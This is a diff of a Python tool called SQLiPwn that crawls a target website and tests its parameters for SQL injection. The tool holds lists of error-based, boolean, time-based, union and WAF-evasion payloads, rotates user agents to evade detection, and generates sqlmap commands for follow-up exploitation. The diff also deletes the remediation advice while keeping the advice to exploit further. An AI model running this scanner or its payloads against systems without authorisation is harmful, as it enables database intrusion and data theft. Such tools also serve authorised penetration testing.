@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 """
-SQLiPwn - Advanced SQL Injection Security Scanner v2.1
+SQLiPwn v2.1
 Professional SQL injection detection and exploitation tool
 Features: Multi-threading, Authentication support, Professional reporting
-Optimized version with improved performance and reliability
+
 
 Author: syfi
 """
@@ -22,22 +22,21 @@ from typing import Dict, List, Optional, Set, Union
 from urllib.parse import parse_qs, urljoin, urlparse, quote
 import threading
 
-# Third-party imports
 import requests
 from bs4 import BeautifulSoup
 from colorama import Fore, Style, init
 import concurrent.futures
 
-# Local imports
+# Local
 from report_generator import ReportGenerator
 
-# Configure warnings and colorama
+
 init(autoreset=True)
 warnings.filterwarnings('ignore', category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 @dataclass
 class VulnerableEndpoint:
-    """Data class to store vulnerable endpoint information"""
+
     url: str
     parameter: str
     method: str
@@ -51,29 +50,29 @@ class VulnerableEndpoint:
     authenticated: bool = False
 
 class UserAgentManager:
-    """Optimized user agent management for evasion"""
+
     
     def __init__(self):
         self.user_agents = [
-            # Modern Desktop browsers (prioritized)
+
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
             'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0',
             
-            # Mobile browsers for diversity
+            # Mobile browsers
             'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
             'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0',
             'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
             
-            # Security tools (legitimate security testing)
+
             'sqlmap/1.7.11 (http://sqlmap.org)',
             'Nmap Scripting Engine; https://nmap.org/book/nse.html',
             'OWASP ZAP 2.12.0',
             'Burp Suite Professional',
             
-            # API clients
+
             'curl/8.4.0',
             'wget/1.21.3',
             'PostmanRuntime/7.36.0',
@@ -85,40 +84,40 @@ class UserAgentManager:
         self._last_used_index = 0
     
     def get_random_user_agent(self) -> str:
-        """Get a random user agent string with thread safety"""
+
         with self._lock:
             return random.choice(self.user_agents)
     
     def get_rotating_user_agent(self) -> str:
-        """Get user agents in rotation (more even distribution)"""
+
         with self._lock:
             ua = self.user_agents[self._last_used_index]
             self._last_used_index = (self._last_used_index + 1) % len(self.user_agents)
             return ua
     
     def get_default_user_agent(self) -> str:
-        """Get default user agent"""
+
         return self.user_agents[0]
 
 class PayloadEngine:
-    """Advanced SQL injection payload management system with improved efficiency"""
+
     
     def __init__(self, fast_mode: bool = False, thorough_mode: bool = False):
         self.fast_mode = fast_mode
         self.thorough_mode = thorough_mode
         
-        # Core error-based payloads (optimized order by effectiveness)
+
         self.error_payloads = [
-            "'",  # Most basic and effective
+            "'",  # basic
             "\"",
             "' OR '1'='1",
             "\" OR \"1\"=\"1",
             "' OR 1=1--",
             "\" OR 1=1--",
             "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
-            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",  # MySQL
-            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--",   # MySQL
-            "' AND 1=CAST(@@version AS int)--",  # SQL Server
+            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",  
+            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--",   
+            "' AND 1=CAST(@@version AS int)--",  
             "' AND 1=CONVERT(int,@@version)--",  # SQL Server
             "' UNION SELECT version(),1,1--",    # PostgreSQL
             "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) IS NOT NULL--",  # Oracle
@@ -142,7 +141,7 @@ class PayloadEngine:
              "' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))<0--")
         ]
         
-        # Time-based blind payloads (optimized for different databases)
+        # Time-based blind payloads
         self.time_payloads = [
             "' AND IF(1=1,SLEEP(5),0)--",        # MySQL conditional delay
             "' AND SLEEP(5)--",                  # MySQL direct delay
@@ -154,7 +153,7 @@ class PayloadEngine:
             "' AND 1=(SELECT COUNT(*) FROM information_schema.tables WHERE table_name='nonexistent' OR SLEEP(5))--"
         ]
         
-        # Union-based payloads (ordered by common column counts)
+        # Union-based payloads 
         self.union_payloads = [
             "' UNION SELECT NULL--",
             "' UNION SELECT NULL,NULL--",
@@ -169,7 +168,7 @@ class PayloadEngine:
             "' ORDER BY 3--",
             "' ORDER BY 4--",
             "' ORDER BY 5--",
-            "' ORDER BY 100--"  # This should error and reveal column count
+            "' ORDER BY 100--" 
         ]
         
         # WAF evasion payloads (only if thorough mode)
@@ -198,7 +197,7 @@ class PayloadEngine:
         elif thorough_mode:
             self.error_payloads.extend(self.evasion_payloads)
         
-        # Enhanced database-specific error patterns for identification
+
         self.db_patterns = {
             'MySQL': [
                 r'You have an error in your SQL syntax',
@@ -252,32 +251,32 @@ class PayloadEngine:
         }
 
 class AuthenticationManager:
-    """Enhanced authentication and session management with improved reliability"""
+
     
     def __init__(self, session: requests.Session):
         self.session = session
         self.is_authenticated = False
         self.auth_confidence = 0
         
-        # Improved authentication indicators
+
         self.auth_indicators = [
-            # Strong indicators
+            # indicators
             'logout', 'sign out', 'dashboard', 'profile', 'account', 'welcome',
             'admin', 'user panel', 'settings', 'signed in', 'logged in', 'my account',
-            # Weaker indicators  
+
             'welcome back', 'hello', 'member', 'authenticated'
         ]
         
         self.unauth_indicators = [
-            # Strong indicators
+
             'login', 'signin', 'sign in', 'authenticate', 'unauthorized', 'access denied',
             'please log in', 'session expired', 'authentication required', 'forbidden',
-            # Weaker indicators
+
             'please sign in', 'login required', 'not authorized'
         ]
     
     def setup_cookies(self, cookies: Union[str, None]) -> bool:
-        """Enhanced cookie setup from string or file"""
+
         if not cookies:
             return False
         
@@ -291,7 +290,7 @@ class AuthenticationManager:
             return False
     
     def _load_cookies_from_file(self, cookie_file: str) -> bool:
-        """Enhanced cookie file loading with multiple format support"""
+
         try:
             import json
             with open(cookie_file, 'r', encoding='utf-8') as f:
@@ -299,12 +298,12 @@ class AuthenticationManager:
             
             cookies_loaded = 0
             
-            # Try JSON format first (Chrome/Firefox export)
+
             if content.startswith('[') or content.startswith('{'):
                 try:
                     cookie_data = json.loads(content)
                     
-                    # Chrome/Firefox JSON format
+
                     if isinstance(cookie_data, list):
                         for cookie in cookie_data:
                             if isinstance(cookie, dict):
@@ -330,13 +329,13 @@ class AuthenticationManager:
                 except json.JSONDecodeError:
                     pass
             
-            # Try Netscape/cURL format or simple format
+
             for line in content.split('\n'):
                 line = line.strip()
                 if not line or line.startswith('#'):
                     continue
                 
-                # Netscape format: domain\tTRUE\tpath\tFALSE\texpires\tname\tvalue
+
                 if '\t' in line and len(line.split('\t')) >= 7:
                     parts = line.split('\t')
                     name, value = parts[5], parts[6]
@@ -363,11 +362,11 @@ class AuthenticationManager:
         return False
     
     def _parse_cookie_string(self, cookie_string: str) -> bool:
-        """Enhanced cookie string parsing"""
+
         try:
             cookies_loaded = 0
             
-            # Handle different separators
+
             for separator in [';', '\n', ',']:
                 if separator in cookie_string:
                     cookie_pairs = cookie_string.split(separator)
@@ -395,7 +394,7 @@ class AuthenticationManager:
         return False
     
     def test_authentication(self, test_url: str) -> bool:
-        """Enhanced authentication testing with confidence scoring"""
+
         try:
             print(f"{Fore.CYAN}[*] Testing authentication against: {test_url}")
             response = self.session.get(test_url, timeout=10, verify=False)
@@ -409,7 +408,7 @@ class AuthenticationManager:
             
             response_text = response.text.lower()
             
-            # Calculate confidence scores
+            # confidence scores
             auth_score = sum(3 if indicator in ['logout', 'dashboard', 'profile'] else 1 
                            for indicator in self.auth_indicators if indicator in response_text)
             unauth_score = sum(3 if indicator in ['login', 'signin', 'unauthorized'] else 1 
@@ -430,7 +429,7 @@ class AuthenticationManager:
             return False
 
 class WebCrawler:
-    """Enhanced web crawler with optimized parameter extraction and performance"""
+
     
     def __init__(self, base_url: str, max_depth: int = 3, delay: float = 0.5, 
                  max_pages: int = 100, auth_manager: AuthenticationManager = None, 
@@ -457,7 +456,7 @@ class WebCrawler:
             }
             self.session.verify = False
         
-        # Enhanced default headers
+        # default headers
         default_headers = {
             'User-Agent': user_agent_manager.get_default_user_agent() if user_agent_manager else 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
@@ -482,7 +481,7 @@ class WebCrawler:
                 self.session.cookies.set(cookie.name, cookie.value, domain=cookie.domain, path=cookie.path)
     
     def crawl(self) -> Dict[str, Dict[str, List[str]]]:
-        """Enhanced breadth-first crawling with intelligent parameter extraction"""
+
         print(f"{Fore.CYAN}[*] Starting enhanced web crawling...")
         print(f"{Fore.CYAN}[*] Target: {self.base_url}")
         print(f"{Fore.CYAN}[*] Max depth: {self.max_depth}, Max pages: {self.max_pages}")
@@ -503,7 +502,7 @@ class WebCrawler:
             pages_crawled += 1
             
             try:
-                # Rotate user agent for each request if enabled
+
                 if self.user_agent_manager:
                     self.session.headers['User-Agent'] = self.user_agent_manager.get_rotating_user_agent()
                 
@@ -526,10 +525,10 @@ class WebCrawler:
                     # Extract form parameters
                     self._extract_form_parameters(soup, current_url)
                     
-                    # Extract AJAX endpoints from JavaScript
+
                     self._extract_ajax_endpoints(soup, current_url)
                     
-                    # Extract API endpoints from data attributes and JavaScript
+
                     self._extract_api_endpoints(soup, current_url)
                     
                     # Extract links for next depth level
@@ -555,7 +554,7 @@ class WebCrawler:
         return self.found_parameters
     
     def _extract_get_parameters(self, url: str):
-        """Enhanced GET parameter extraction with better parsing"""
+
         try:
             parsed_url = urlparse(url)
             if parsed_url.query:
@@ -569,10 +568,10 @@ class WebCrawler:
                         if param and param not in self.found_parameters[base_url]['GET']:
                             self.found_parameters[base_url]['GET'].append(param)
         except Exception as e:
-            pass  # Silently handle malformed URLs
+            pass  
     
     def _extract_form_parameters(self, soup: BeautifulSoup, current_url: str):
-        """Enhanced form parameter extraction with better handling"""
+
         try:
             forms = soup.find_all('form')
             
@@ -580,7 +579,7 @@ class WebCrawler:
                 action = form.get('action', '')
                 method = form.get('method', 'GET').upper()
                 
-                # Resolve form action URL
+
                 if action:
                     form_url = urljoin(current_url, action)
                 else:
@@ -599,7 +598,7 @@ class WebCrawler:
                     if name and input_type not in skip_types:
                         params.append(name)
                     
-                    # Also check for hidden parameters that might be interesting
+                    # check for hidden parameters
                     elif name and input_type == 'hidden' and not any(skip in name.lower() for skip in ['csrf', 'token', '_token']):
                         params.append(name)
                 
@@ -618,16 +617,16 @@ class WebCrawler:
                         if param not in self.found_parameters[form_url][method]:
                             self.found_parameters[form_url][method].append(param)
         except Exception as e:
-            pass  # Silently handle parsing errors
+            pass  
     
     def _extract_ajax_endpoints(self, soup: BeautifulSoup, current_url: str):
-        """Enhanced AJAX endpoint extraction from JavaScript"""
+
         try:
             scripts = soup.find_all('script')
             
             for script in scripts:
                 if script.string:
-                    # Enhanced AJAX patterns
+                    # AJAX patterns
                     ajax_patterns = [
                         r'\.get\(["\']([^"\']+)["\']',
                         r'\.post\(["\']([^"\']+)["\']',
@@ -653,10 +652,10 @@ class WebCrawler:
                         except re.error:
                             continue
         except Exception as e:
-            pass  # Silently handle parsing errors
+            pass  # handle parsing errors
     
     def _extract_api_endpoints(self, soup: BeautifulSoup, current_url: str):
-        """Extract API endpoints from data attributes and configuration"""
+
         try:
             # Look for data-* attributes that might contain API endpoints
             elements_with_data = soup.find_all(attrs=lambda x: x and any(k.startswith('data-') for k in x.keys()))
@@ -664,13 +663,13 @@ class WebCrawler:
             for elem in elements_with_data:
                 for attr_name, attr_value in elem.attrs.items():
                     if attr_name.startswith('data-') and isinstance(attr_value, str):
-                        # Look for URL patterns in data attributes
+
                         if ('api' in attr_name.lower() or 'url' in attr_name.lower()) and ('/' in attr_value or '?' in attr_value):
                             if '?' in attr_value:
                                 api_url = urljoin(current_url, attr_value)
                                 self._extract_get_parameters(api_url)
             
-            # Look for API configuration in script tags
+
             scripts = soup.find_all('script', type='application/json')
             for script in scripts:
                 if script.string:
@@ -681,10 +680,10 @@ class WebCrawler:
                     except:
                         pass
         except Exception as e:
-            pass  # Silently handle parsing errors
+            pass  # handle parsing errors
     
     def _extract_urls_from_json(self, data, base_url):
-        """Recursively extract URLs from JSON configuration"""
+
         try:
             if isinstance(data, dict):
                 for key, value in data.items():
@@ -703,11 +702,11 @@ class WebCrawler:
             pass
     
     def _extract_links(self, soup: BeautifulSoup, current_url: str, depth: int):
-        """Enhanced link extraction and prioritization"""
+
         try:
             links = soup.find_all('a', href=True)
             
-            # Prioritize links that are more likely to contain parameters
+
             priority_links = []
             regular_links = []
             
@@ -716,22 +715,22 @@ class WebCrawler:
                 next_url = urljoin(current_url, href)
                 
                 if self._is_valid_crawl_url(next_url):
-                    # Prioritize links with parameters or interesting paths
+
                     if ('?' in href or 
                         any(keyword in href.lower() for keyword in ['search', 'filter', 'sort', 'page', 'id=', 'cat=', 'user='])):
                         priority_links.append((next_url, depth + 1))
                     else:
                         regular_links.append((next_url, depth + 1))
             
-            # Add priority links first, then regular links
-            for link_data in priority_links + regular_links[:50]:  # Limit to prevent queue explosion
+
+            for link_data in priority_links + regular_links[:50]:  
                 self.url_queue.append(link_data)
                 
         except Exception as e:
-            pass  # Silently handle parsing errors
+            pass  # handle parsing errors
     
     def _is_valid_crawl_url(self, url: str) -> bool:
-        """Enhanced URL validation for crawling"""
+
         try:
             parsed = urlparse(url)
             base_parsed = urlparse(self.base_url)
@@ -766,7 +765,7 @@ class WebCrawler:
             if parsed.scheme and parsed.scheme not in ['http', 'https']:
                 return False
             
-            # Skip very long URLs (likely not useful)
+            # Skip very long URLs
             if len(url) > 500:
                 return False
             
@@ -776,10 +775,10 @@ class WebCrawler:
             return False
     
     def _optimize_parameters(self):
-        """Enhanced parameter optimization and deduplication"""
+
         for url in list(self.found_parameters.keys()):
             for method in self.found_parameters[url]:
-                # Remove duplicates and filter common non-injectable parameters
+
                 filtered_params = []
                 skip_params = [
                     'csrf_token', 'token', '_token', 'authenticity_token', 
@@ -789,18 +788,18 @@ class WebCrawler:
                 
                 for param in set(self.found_parameters[url][method]):
                     if param and param.lower() not in [p.lower() for p in skip_params]:
-                        # Also skip obviously non-injectable parameters
+
                         if not any(skip_word in param.lower() for skip_word in ['captcha', 'recaptcha', 'antiforgery']):
                             filtered_params.append(param)
                 
                 self.found_parameters[url][method] = sorted(list(set(filtered_params)))
             
-            # Remove endpoints with no parameters
+
             if not self.found_parameters[url]['GET'] and not self.found_parameters[url]['POST']:
                 del self.found_parameters[url]
 
 class InjectionTester:
-    """Highly optimized SQL injection testing engine with advanced detection"""
+
     
     def __init__(self, payload_engine: PayloadEngine, auth_manager: AuthenticationManager = None, 
                  timeout: int = 10, headers: Dict[str, str] = None, user_agent_manager: UserAgentManager = None,
@@ -821,7 +820,7 @@ class InjectionTester:
             }
             self.session.verify = False
         
-        # Enhanced default headers
+        # default headers
         default_headers = {
             'User-Agent': user_agent_manager.get_default_user_agent() if user_agent_manager else 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Accept': '*/*',
@@ -841,7 +840,7 @@ class InjectionTester:
                 self.session.cookies.set(cookie.name, cookie.value, domain=cookie.domain, path=cookie.path)
     
     def test_endpoint(self, url: str, params: Dict[str, List[str]]) -> List[VulnerableEndpoint]:
-        """Test endpoint for SQL injection vulnerabilities with optimized approach"""
+
         vulnerabilities = []
         
         # Test GET parameters
@@ -863,7 +862,7 @@ class InjectionTester:
         return vulnerabilities
     
     def _test_parameter(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:
-        """Optimized parameter testing with intelligent detection ordering"""
+
         print(f"{Fore.CYAN}[*] Testing {method} parameter '{param}' on {url}")
         
         # Test in order of reliability and speed
@@ -891,7 +890,7 @@ class InjectionTester:
         return best_result
     
     def _test_error_based(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:
-        """Enhanced error-based SQL injection testing"""
+
         for payload in self.payload_engine.error_payloads:
             try:
                 start_time = time.time()
@@ -901,7 +900,7 @@ class InjectionTester:
                     
                 response_time = time.time() - start_time
                 
-                # Check for database-specific errors with enhanced pattern matching
+
                 for db_type, patterns in self.payload_engine.db_patterns.items():
                     for pattern in patterns:
                         matches = re.findall(pattern, response.text, re.IGNORECASE)
@@ -931,7 +930,7 @@ class InjectionTester:
         return None
     
     def _test_boolean_blind(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:
-        """Enhanced boolean-based blind SQL injection testing"""
+
         try:
             # Get or create baseline response
             baseline_key = f"{url}_{param}_{method}"
@@ -949,7 +948,7 @@ class InjectionTester:
             
             baseline = self._baseline_cache[baseline_key]
             
-            # Test true/false payload pairs
+
             for true_payload, false_payload in self.payload_engine.boolean_payloads:
                 try:
                     true_response = self._make_request(url, param, true_payload, method)
@@ -961,12 +960,12 @@ class InjectionTester:
                     true_hash = hashlib.md5(true_response.text.encode()).hexdigest()
                     false_hash = hashlib.md5(false_response.text.encode()).hexdigest()
                     
-                    # Enhanced response analysis
+                    # response analysis
                     length_diff = abs(len(true_response.text) - len(false_response.text))
                     status_diff = true_response.status_code != false_response.status_code
                     hash_diff = true_hash != false_hash
                     
-                    # Check if true condition matches baseline (expected behavior)
+
                     true_matches_baseline = (true_hash == baseline['hash'] or 
                                            abs(len(true_response.text) - baseline['length']) < 100)
                     
@@ -997,9 +996,9 @@ class InjectionTester:
         return None
     
     def _test_time_based(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:
-        """Enhanced time-based blind SQL injection testing"""
+
         try:
-            # Get baseline response times with better sampling
+
             baseline_key = f"{url}_{param}_{method}_time"
             
             if baseline_key not in self._baseline_cache:
@@ -1017,7 +1016,7 @@ class InjectionTester:
                 if not baseline_times:
                     return None
                 
-                # Calculate baseline with outlier removal
+
                 if len(baseline_times) >= 3:
                     baseline_times.sort()
                     baseline_times = baseline_times[1:-1]  # Remove outliers
@@ -1027,7 +1026,7 @@ class InjectionTester:
             
             avg_baseline = self._baseline_cache[baseline_key]
             
-            # Test time-based payloads
+
             for payload in self.payload_engine.time_payloads:
                 try:
                     start_time = time.time()
@@ -1036,7 +1035,7 @@ class InjectionTester:
                     
                     delay_diff = response_time - avg_baseline
                     
-                    # Enhanced time-based detection
+                    # time-based detection
                     if delay_diff > 3:  # 3+ second delay indicates likely injection
                         confidence = "HIGH" if delay_diff > 4.5 else "MEDIUM"
                         
@@ -1077,7 +1076,7 @@ class InjectionTester:
         return None
     
     def _test_union_based(self, url: str, param: str, method: str) -> Optional[VulnerableEndpoint]:
-        """Enhanced union-based SQL injection testing"""
+
         for payload in self.payload_engine.union_payloads:
             try:
                 start_time = time.time()
@@ -1087,7 +1086,7 @@ class InjectionTester:
                     
                 response_time = time.time() - start_time
                 
-                # Enhanced union injection indicators
+                # union injection indicators
                 union_indicators = [
                     (r'Column count doesn\'t match', 'HIGH'),
                     (r'The used SELECT statements have a different number of columns', 'HIGH'),
@@ -1123,7 +1122,7 @@ class InjectionTester:
         return None
     
     def _make_request(self, url: str, param: str, payload: str, method: str, timeout: int = None) -> Optional[requests.Response]:
-        """Enhanced HTTP request with better error handling"""
+
         try:
             # Use instance timeout if not specified
             if timeout is None:
@@ -1143,25 +1142,25 @@ class InjectionTester:
         except requests.exceptions.Timeout:
             raise  # Re-raise timeout for special handling
         except Exception as e:
-            # Log specific errors that might be useful
+
             if "Connection refused" in str(e) or "Name resolution failed" in str(e):
                 print(f"{Fore.YELLOW}[!] Connection error for {param}: {str(e)}")
             return None
     
     def _build_get_url(self, url: str, param: str, payload: str) -> str:
-        """Enhanced GET URL building with better encoding"""
+
         try:
-            # URL encode the payload properly
+
             encoded_payload = quote(payload, safe='')  # Encode everything
             separator = '&' if '?' in url else '?'
             return f"{url}{separator}{param}={encoded_payload}"
         except Exception:
-            # Fallback to simple concatenation
+
             separator = '&' if '?' in url else '?'
             return f"{url}{separator}{param}={payload}"
     
     def _calculate_error_confidence(self, pattern: str, response_text: str) -> str:
-        """Calculate confidence level for error-based injection"""
+
         high_confidence_keywords = [
             'syntax', 'mysql_fetch', 'ora-', 'postgresql', 'sql server',
             'duplicate entry', 'unknown column', 'invalid input syntax'
@@ -1177,7 +1176,7 @@ class InjectionTester:
             return "LOW"
     
     def _extract_error_context(self, response_text: str, error_match: str) -> str:
-        """Extract relevant error context for better reporting"""
+
         try:
             # Find the line containing the error
             lines = response_text.split('\n')
@@ -1200,12 +1199,12 @@ class InjectionTester:
             return f"Database error detected: {error_match}"
     
     def _generate_sqlmap_command(self, url: str, param: str, method: str) -> str:
-        """Enhanced SQLMap command generation with better options"""
+
         base_cmd = ""
         
-        # Build base command
+        # base command
         if method == 'GET':
-            # For GET, include parameter in URL
+
             test_url = self._build_get_url(url, param, "INJECT")
             base_cmd = f'sqlmap -u "{test_url}"'
         else:
@@ -1240,11 +1239,11 @@ class InjectionTester:
         return base_cmd
     
     def _get_confidence_score(self, confidence: str) -> int:
-        """Convert confidence to numeric score for comparison"""
+
         return {'LOW': 1, 'MEDIUM': 2, 'HIGH': 3}.get(confidence, 0)
 
 class VulnerabilityValidator:
-    """Enhanced false positive elimination with better accuracy"""
+
     
     def __init__(self):
         self.false_positive_patterns = [
@@ -1262,12 +1261,12 @@ class VulnerabilityValidator:
             r'cloudflare',
             r'access denied',
             
-            # Maintenance and generic errors
+
             r'maintenance mode',
             r'site under maintenance',
             r'temporarily unavailable',
             
-            # False positive error messages
+            # False positive
             r'page not found',
             r'file not found',
             r'invalid request',
@@ -1287,21 +1286,21 @@ class VulnerabilityValidator:
         ]
     
     def validate(self, vulnerability: VulnerableEndpoint) -> bool:
-        """Enhanced vulnerability validation to reduce false positives"""
+
         error_msg = vulnerability.error_message.lower()
         
-        # First check for obvious false positives
+
         for pattern in self.false_positive_patterns:
             if re.search(pattern, error_msg, re.IGNORECASE):
                 return False
         
-        # Check for true positive indicators (increase confidence)
+
         true_positive_score = 0
         for pattern in self.true_positive_patterns:
             if re.search(pattern, error_msg, re.IGNORECASE):
                 true_positive_score += 1
         
-        # Specific validation by injection type
+
         if vulnerability.injection_type.startswith("Time-based"):
             return self._validate_time_based(vulnerability)
         elif vulnerability.injection_type.startswith("Boolean-based"):
@@ -1314,12 +1313,12 @@ class VulnerabilityValidator:
         return True
     
     def _validate_time_based(self, vuln: VulnerableEndpoint) -> bool:
-        """Validate time-based injection"""
-        # Require at least 3 seconds delay for valid time-based injection
+
+
         return vuln.response_time >= 3.0
     
     def _validate_boolean_based(self, vuln: VulnerableEndpoint) -> bool:
-        """Validate boolean-based injection"""
+
         if "Response length difference:" in vuln.error_message:
             try:
                 # Extract the length difference
@@ -1328,31 +1327,31 @@ class VulnerabilityValidator:
                     diff = int(diff_match.group(1))
                     return diff >= 50  # Require at least 50 bytes difference
                 
-                # Fallback parsing
+
                 diff = float(vuln.error_message.split(":")[1].strip().split()[0])
                 return diff >= 50
             except:
                 return False
         
-        # Check for status code differences
+
         if "Status: True" in vuln.error_message:
             return True
             
         return False
     
     def _validate_error_based(self, vuln: VulnerableEndpoint, true_positive_score: int) -> bool:
-        """Validate error-based injection"""
+
         error_msg = vuln.error_message.lower()
         
-        # High confidence if we have clear SQL keywords
+
         sql_keywords = ['syntax', 'mysql', 'postgresql', 'oracle', 'sql server', 'column', 'table', 'query']
         sql_score = sum(1 for keyword in sql_keywords if keyword in error_msg)
         
-        # Require either true positive patterns or multiple SQL keywords
+
         return true_positive_score > 0 or sql_score >= 2
     
     def _validate_union_based(self, vuln: VulnerableEndpoint) -> bool:
-        """Validate union-based injection"""
+
         error_msg = vuln.error_message.lower()
         
         # Union-based should have specific error patterns
@@ -1360,7 +1359,7 @@ class VulnerabilityValidator:
         return any(keyword in error_msg for keyword in union_keywords)
 
 class SQLiPwnScanner:
-    """Main SQLiPwn scanner orchestrator with enhanced performance and reliability"""
+
     
     def __init__(self, target_url: str, max_depth: int = 3, threads: int = 10, 
                  delay: float = 0.5, timeout: int = 10, cookies: str = None, 
@@ -1391,7 +1390,7 @@ class SQLiPwnScanner:
             if auth_setup_success and auth_test:
                 self.auth_manager.test_authentication(target_url)
         
-        # Initialize crawler and tester with enhanced configuration
+
         self.crawler = WebCrawler(
             target_url, max_depth, delay, 100, 
             self.auth_manager, headers, self.user_agent_manager, proxy
@@ -1402,7 +1401,7 @@ class SQLiPwnScanner:
         )
     
     def scan(self):
-        """Execute comprehensive SQL injection security scan with enhanced reporting"""
+
         print(f"{Fore.GREEN}{'='*80}")
         print(f"{Fore.GREEN}SQLiPwn - Advanced SQL Injection Security Scanner v2.1")
         print(f"{Fore.GREEN}Professional SQL injection detection and exploitation tool")
@@ -1415,7 +1414,7 @@ class SQLiPwnScanner:
         print(f"{Fore.GREEN}  - Request Delay: {self.delay}s")
         print(f"{Fore.GREEN}  - Request Timeout: {self.timeout}s")
         
-        # Enhanced authentication status display
+        # authentication status display
         auth_summary = {'cookie_count': len(self.auth_manager.session.cookies)}
         if auth_summary['cookie_count'] > 0:
             conf_str = f"({self.auth_manager.auth_confidence}% confidence)" if hasattr(self.auth_manager, 'auth_confidence') else ""
@@ -1423,7 +1422,7 @@ class SQLiPwnScanner:
         else:
             print(f"{Fore.YELLOW}  - Authentication: Unauthenticated scan")
         
-        # Enhanced feature status display
+        # feature status display
         if self.user_agent_manager:
             print(f"{Fore.GREEN}  - User Agent: Random rotation ({len(self.user_agent_manager.user_agents)} agents)")
         else:
@@ -1447,7 +1446,7 @@ class SQLiPwnScanner:
         scan_start_time = time.time()
         
         try:
-            # Phase 1: Enhanced web crawling
+            # Phase 1: web crawling
             print(f"{Fore.CYAN}[PHASE 1] Web crawling and parameter discovery...")
             crawl_start = time.time()
             parameters = self.crawler.crawl()
@@ -1466,7 +1465,7 @@ class SQLiPwnScanner:
             print(f"{Fore.GREEN}    - {len(parameters)} endpoints discovered")
             print(f"{Fore.GREEN}    - {total_params} parameters identified for testing")
             
-            # Update scan statistics
+
             self.reporter.scan_stats['urls_crawled'] = len(parameters)
             self.reporter.scan_stats['parameters_tested'] = total_params
             
@@ -1474,18 +1473,18 @@ class SQLiPwnScanner:
             print(f"\n{Fore.CYAN}[PHASE 2] SQL injection vulnerability testing...")
             test_start = time.time()
             
-            # Enhanced progress tracking
+
             total_endpoints = len(parameters)
             completed_endpoints = 0
             
             with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
-                # Submit all endpoint testing tasks
+
                 future_to_endpoint = {
                     executor.submit(self._test_endpoint_with_progress, url, params, i+1, total_endpoints): (url, params)
                     for i, (url, params) in enumerate(parameters.items())
                 }
                 
-                # Process completed tasks
+
                 for future in concurrent.futures.as_completed(future_to_endpoint):
                     url, params = future_to_endpoint[future]
                     completed_endpoints += 1
@@ -1499,7 +1498,7 @@ class SQLiPwnScanner:
                                 self.reporter.add_vulnerability(vuln)
                                 validated_vulns += 1
                         
-                        # Enhanced progress display
+                        # progress display
                         progress = (completed_endpoints / total_endpoints) * 100
                         if validated_vulns > 0:
                             print(f"{Fore.GREEN}[+] Progress: {progress:.1f}% ({completed_endpoints}/{total_endpoints}) - {validated_vulns} vulnerabilities found in {url}")
@@ -1512,19 +1511,19 @@ class SQLiPwnScanner:
             test_duration = time.time() - test_start
             print(f"{Fore.GREEN}[+] Vulnerability testing completed in {test_duration:.1f}s")
             
-            # Phase 3: Enhanced reporting
+            # Phase 3:  reporting
             print(f"\n{Fore.CYAN}[PHASE 3] Generating comprehensive reports...")
             
-            # Display detailed summary
+            # Display summary
             self.reporter.display_summary()
             
             # Generate HTML report by default
             html_file = self.reporter.generate_html_report()
             
-            # Calculate total scan time
+            # total scan time
             total_scan_time = time.time() - scan_start_time
             
-            # Enhanced completion message
+
             print(f"\n{Fore.GREEN}{'='*80}")
             print(f"{Fore.GREEN}SCAN COMPLETED SUCCESSFULLY")
             print(f"{Fore.GREEN}{'='*80}")
@@ -1532,7 +1531,7 @@ class SQLiPwnScanner:
             print(f"{Fore.GREEN}HTML Dashboard: {html_file}")
             print(f"{Fore.GREEN}Tool: SQLiPwn by syfi")
             
-            # Final security assessment
+
             vuln_count = len(self.reporter.vulnerabilities)
             high_risk = len([v for v in self.reporter.vulnerabilities if v.confidence == 'HIGH'])
             
@@ -1543,13 +1542,9 @@ class SQLiPwnScanner:
                     print(f"{Fore.RED}CRITICAL: {high_risk} HIGH CONFIDENCE vulnerabilities require immediate attention!")
                 print(f"{Fore.RED}{'='*80}")
                 
-                # Provide remediation advice
                 print(f"\n{Fore.YELLOW}RECOMMENDED ACTIONS:")
                 print(f"{Fore.YELLOW}1. Review the HTML report for detailed vulnerability information")
                 print(f"{Fore.YELLOW}2. Use the provided SQLMap commands for further exploitation testing")
-                print(f"{Fore.YELLOW}3. Implement parameterized queries/prepared statements")
-                print(f"{Fore.YELLOW}4. Apply input validation and sanitization")
-                print(f"{Fore.YELLOW}5. Consider implementing a Web Application Firewall (WAF)")
